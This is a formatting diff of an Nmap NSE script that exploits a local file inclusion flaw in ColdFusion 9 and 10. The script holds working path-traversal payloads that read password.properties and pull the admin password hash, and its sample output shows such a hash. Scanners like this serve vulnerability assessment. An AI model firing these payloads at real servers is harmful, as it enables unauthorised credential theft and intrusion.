@@ -1,5 +1,7 @@
 description = [[
-Attempts to retrieve version, absolute path of administration panel and the file 'password.properties' from vulnerable installations of ColdFusion 9 and 10.
+Attempts to retrieve version, absolute path of administration panel and the
+file 'password.properties' from vulnerable installations of ColdFusion 9 and
+10.
 
 This was based on the exploit 'ColdSub-Zero.pyFusion v2'.
 ]]
@@ -20,10 +22,8 @@ This was based on the exploit 'ColdSub-Zero.pyFusion v2'.
 -- |_encrypted=true
 --
 -- @xmloutput
--- <script id="http-coldfusion-subzero" output="&#xa;  installation_path: C:\inetpub\wwwroot\CFIDE\adminapi\customtags&#xa;  version: 9&#xa;  password_properties: #Fri Mar 02 17:03:01 CST 2012&#xd;&#xa;rdspassword=&#xd;&#xa;password=AA251FD567358F16B7DE3F3B22DE8193A7517CD0&#xd;&#xa;encrypted=true&#xd;&#xa;"><elem key="installation_path">C:\inetpub\wwwroot\CFIDE\adminapi\customtags</elem>
 -- <elem key="version">9</elem>
 -- <elem key="password_properties">#Fri Mar 02 17:03:01 CST 2012&#xd;&#xa;rdspassword=&#xd;&#xa;password=AA251FD567358F16B7DE3F3B22DE8193A7517CD0&#xd;&#xa;encrypted=true&#xd;&#xa;</elem>
--- </script>
 -- @args http-coldfusion-subzero.basepath Base path. Default: /.
 --
 ---
@@ -41,10 +41,16 @@ local openssl = stdnse.silent_require "openssl"
 
 portrule = shortport.http
 
-local PATH_PAYLOAD = "CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/analyzer/index.cfm&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"
+local PATH_PAYLOAD = "CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&\z
+attributes.file=../../administrator/analyzer/index.cfm&attributes.locale=it&\z
+attributes.var=it&attributes.jscript=false&attributes.type=text/html&\z
+attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"
 local IMG_PAYLOAD = "CFIDE/administrator/images/loginbackground.jpg"
-local LFI_PAYLOAD_FRAG_1 = "CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename="
-local LFI_PAYLOAD_FRAG_2 = "&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"
+local LFI_PAYLOAD_FRAG_1 = "CFIDE/adminapi/customtags/l10n.cfm?attributes.id\z
+=it&attributes.file=../../administrator/mail/download.cfm&filename="
+local LFI_PAYLOAD_FRAG_2 = "&attributes.locale=it&attributes.var=it&\z
+attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&\z
+thisTag.executionmode=end&thisTag.generatedContent=htp"
 local CREDENTIALS_PAYLOADS = {
   "../../lib/password.properties",
   "..\\..\\lib\\password.properties",
@@ -59,13 +65,15 @@ local CREDENTIALS_PAYLOADS = {
 }
 
 ---
--- Extracts absolute path of installation by reading the ANALIZER_DIRECTORY value from the header 'set-cookie'
+-- Extracts absolute path of installation by reading the ANALIZER_DIRECTORY
+-- value from the header 'set-cookie'
 --
 local function get_installation_path(host, port, basepath)
   local req = http.get(host, port, basepath..PATH_PAYLOAD)
   if req.header['set-cookie'] then
     stdnse.print_debug(1, "%s:Header 'set-cookie' detected in response.", SCRIPT_NAME)
-    local _, _, path = string.find(req.header['set-cookie'], "path=/, ANALYZER_DIRECTORY=(.-);path=/")
+    local _, _, path = string.find(req.header['set-cookie'],
+      "path=/, ANALYZER_DIRECTORY=(.-);path=/")
     if path then
       stdnse.print_debug(1, "%s: Extracted path:%s", SCRIPT_NAME, path)
       return path
@@ -105,7 +113,9 @@ local function exploit(host, port, basepath)
   for i, vector in ipairs(CREDENTIALS_PAYLOADS) do
     local req = http.get(host, port, basepath..LFI_PAYLOAD_FRAG_1..vector..LFI_PAYLOAD_FRAG_2)
       if req.body and string.find(req.body, "encrypted=true") then
-        stdnse.print_debug(1, "%s: String pattern found. Exploitation worked with vector '%s'.", SCRIPT_NAME, vector)
+        stdnse.print_debug(1,
+          "%s: String pattern found. Exploitation worked with vector '%s'.",
+          SCRIPT_NAME, vector)
         return true, req.body
       end
   end
